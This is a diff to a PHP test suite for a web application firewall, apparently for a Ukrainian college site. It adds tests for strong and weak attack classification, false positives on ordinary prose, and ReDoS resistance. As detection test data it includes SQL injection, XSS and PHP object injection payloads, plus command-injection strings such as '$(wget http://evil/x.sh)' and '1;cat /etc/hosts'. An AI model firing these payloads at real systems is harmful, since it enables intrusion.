@@ -81,6 +81,7 @@ $attacks = [
 foreach ($attacks as $uri => $category) {
     $hit = $rules->classifyRequest('GET', $uri, $chrome);
     T::eq($category, $hit['category'] ?? null, 'атака ' . $uri . ' (' . ($hit['rule'] ?? '-') . ')');
+    T::eq('strong', $hit['strength'] ?? null, 'атака сильна ' . $uri);
 }
 
 // Погані User-Agent.
@@ -225,6 +226,7 @@ $concreteAttacks = [
 foreach ($concreteAttacks as $uri => $category) {
     $hit = $rules->classifyRequest('GET', $uri, $chrome);
     T::eq($category, $hit['category'] ?? null, 'Concrete-атака ' . $uri . ' (' . ($hit['rule'] ?? '-') . ')');
+    T::eq('strong', $hit['strength'] ?? null, 'Concrete-атака сильна ' . $uri);
 }
 T::eq('PHP_OBJECT_INJECTION', $rules->classifyRequest('POST', '/kontakty', $chrome, 'x=' . rawurlencode('O:40:"Concrete\\Core\\Something":1:{s:1:"a";}'))['rule'] ?? null, 'серіалізований об\'єкт у тілі');
 T::eq('XXE', $rules->classifyRequest('POST', '/kontakty', $chrome, '<!DOCTYPE r [<!ENTITY x SYSTEM "http://a/">]><r>&x;</r>')['rule'] ?? null, 'XXE у тілі');
@@ -330,6 +332,100 @@ $anonAllow = [
 foreach ($anonAllow as $uri) {
     T::eq(null, ConcreteRoutes::classifyAnonymous($uri), 'анонім дозволено ' . $uri);
 }
+
+// --- Звичайний текст: жодних СИЛЬНИХ збігів (у query і в тілі) ---
+$prose = [
+    'My operating system (Windows 10) is slow',
+    'I need more sleep (8 hours)',
+    'I love you <3 and online=yes',
+    'operating system (linux)',
+    'linux; cat command',
+    'Давайте об\'єднаємо (union) і виберемо (select) найкраще',
+    'Формула a<b, b>c і 2<3>1',
+    'Чи можна eval (оцінку) отримати пізніше?',
+    'Підкажіть, будь ласка, розклад :) <3 ;-)',
+    'Відповідь: "SELECT * FROM table" — це SQL-запит з лекції',
+    'The system (as a whole) works; include (optional) notes',
+    'Ціна 100$ (сто доларів); знижка 5%',
+    'Код у лапках: "<b>жирний</b>" і \'<i>\'',
+    'email: test@example.com, сайт http://example.org/novyny',
+    'Посилання http://localhost не працює у мене на ноутбуці',
+    'Зустрінемося o:8 годині',
+    "It's raining or snowing = cold",
+    '../ означає батьківську теку',
+];
+foreach ($prose as $text) {
+    $hq = $rules->classifyRequest('GET', '/search?q=' . rawurlencode($text), $chrome);
+    T::ok($hq === null || $hq['strength'] === 'weak', 'текст у пошуку не сильна атака: ' . $text . ' (' . ($hq['rule'] ?? '-') . ')');
+    $hb = $rules->classifyRequest('POST', '/kontakty', $chrome, 'message=' . rawurlencode($text));
+    T::ok($hb === null || $hb['strength'] === 'weak', 'текст у формі не сильна атака: ' . $text . ' (' . ($hb['rule'] ?? '-') . ')');
+}
+// Слабкі ознаки — повертаються як weak.
+T::eq('weak', $rules->classifyRequest('POST', '/kontakty', $chrome, 'm=' . rawurlencode('<script>alert(1)</script>'))['strength'] ?? null, '<script> у тілі форми — weak');
+T::eq('weak', $rules->classifyRequest('GET', '/search?q=' . rawurlencode('union select'), $chrome)['strength'] ?? null, 'union select без SQL-синтаксису — weak');
+T::eq('weak', $rules->classifyRequest('GET', '/search?q=' . rawurlencode('javascript: basics'), $chrome)['strength'] ?? null, 'javascript: у пошуку — weak');
+// Справжній синтаксис — strong.
+foreach ([
+    "/?q=1' AND SLEEP(5)-- -",
+    '/?q=1) or sleep(5)#',
+    "/?id=1';WAITFOR DELAY '0:0:5'--",
+    "/?f=system('id')",
+    '/?f=eval($_POST[x])',
+    '/?f=phpinfo()',
+    '/?f=base64_decode("ZWNobyAx")',
+    '/?h=' . rawurlencode('<svg/onload=alert(1)>'),
+    '/?c=' . rawurlencode('1;cat /etc/hosts'),
+    '/?c=' . rawurlencode('x|whoami'),
+    '/?c=' . rawurlencode('$(wget http://evil/x.sh)'),
+    '/?id=-1/*!50000union*/ /*!50000select*/ 1,2,3',
+] as $uri) {
+    $hit = $rules->classifyRequest('GET', $uri, $chrome);
+    T::eq('strong', $hit['strength'] ?? null, 'сильна атака ' . $uri . ' (' . ($hit['rule'] ?? '-') . ')');
+}
+// Сегменти шляху.
+T::eq('SQL_UNION', $rules->classifyRequest('GET', '/news/1%27%20union%20select%201,2', $chrome)['rule'] ?? null, 'SQLi у сегменті шляху');
+T::eq('XSS_HANDLER', $rules->classifyRequest('GET', '/novyny/%3Cimg%20src=x%20onerror=alert(1)%3E', $chrome)['rule'] ?? null, 'XSS у сегменті шляху');
+foreach (['/novyny/den-vidkrytykh-dverei-2026', '/pro-koledzh/system-of-education', "/novyny/o'brien-lecture", '/novyny/(archive)', '/novyny/sleep-hygiene-8-hours'] as $uri) {
+    T::eq(null, $rules->classifyRequest('GET', $uri, $chrome), 'слаг не атака: ' . $uri);
+}
+// JSON-екранування в тілі.
+T::eq('XSS_HANDLER', $rules->classifyRequest('POST', '/api', $chrome, '{"html":"\\u003cimg src=x onerror=alert(1)\\u003e"}')['rule'] ?? null, 'JSON \\u003c… розкривається');
+T::eq('PHP_OBJECT_INJECTION', $rules->classifyRequest('PUT', '/api', $chrome, '{"d":"O:8:\\"stdClass\\":0:{}"}')['rule'] ?? null, 'PUT-тіло JSON зі серіалізованим об\'єктом');
+
+// --- Стійкість до ReDoS: без PCRE JIT, великі ворожі входи ---
+ini_set('pcre.jit', '0');
+$slow = new RuleSet(Settings::DEFAULTS);
+$adversarial = [
+    'body /*a /*a…' => str_repeat('/*a', 21000),
+    'body <a <a…' => str_repeat('<a ', 21000),
+    'body http://a…' => str_repeat('http://aaaaaaa', 4500),
+    "body ' or …" => str_repeat("' or ", 13000),
+    'body union( …' => 'union' . str_repeat('(', 60000),
+    'body ;;;…' => str_repeat('; ', 30000),
+    'body O:1:"…' => str_repeat('O:1:"', 13000),
+    'body ../…' => str_repeat('..', 30000),
+    'body sleep(…' => str_repeat('and sleep(', 6000),
+    'body <!doctype…' => '<!doctype ' . str_repeat('a', 60000),
+];
+foreach ($adversarial as $label => $payload) {
+    $t0 = microtime(true);
+    $slow->classifyRequest('POST', '/kontakty', $chrome, $payload);
+    $slow->classifyRequest('GET', '/?q=' . substr($payload, 0, 8000), $chrome);
+    $ms = (microtime(true) - $t0) * 1000;
+    T::ok($ms < 1000, sprintf('ReDoS %s: %.0f мс (без JIT)', $label, $ms));
+}
+// SQL-коментарі вирізаються лінійно; незакритий коментар не ховає решту.
+T::eq('strong', $rules->classifyRequest('GET', '/?id=1 union/**/select/**/1,2', $chrome)['strength'] ?? null, 'union/**/select');
+T::ok($rules->classifyRequest('GET', '/?id=' . rawurlencode('/* x ' . "' or 1=1-- "), $chrome) !== null, 'незакритий коментар не ховає атаку');
+ini_set('pcre.jit', '1');
+
+// --- Адреси без секрету аварійного обходу ---
+use PasichDev\SecurityGuard\Waf\Text;
+T::eq('/novyny?page=2', Text::cleanUrl('/novyny?sg_pass=SECRET&page=2'), 'cleanUrl: прибирає sg_pass');
+T::eq('/', Text::cleanUrl('/?sg_pass=SECRET'), 'cleanUrl: лише sg_pass');
+T::eq('/a?x=1', Text::cleanUrl('/a?x=1&SG_PASS=S&sg%5Fpass=S&sg.pass=S&sg+pass=S&sg_pass[]=S'), 'cleanUrl: усі написання');
+T::eq('/a?x=1#f', Text::cleanUrl('/a?x=1&sg_pass=S#f'), 'cleanUrl: фрагмент лишається');
+T::eq('/a?sg_passport=1', Text::cleanUrl('/a?sg_passport=1'), 'cleanUrl: інший параметр (sg_passport) лишається');
 
 // Honeypot.
 T::ok($rules->isHoneypot('/wp-login.php'), 'honeypot /wp-login.php');
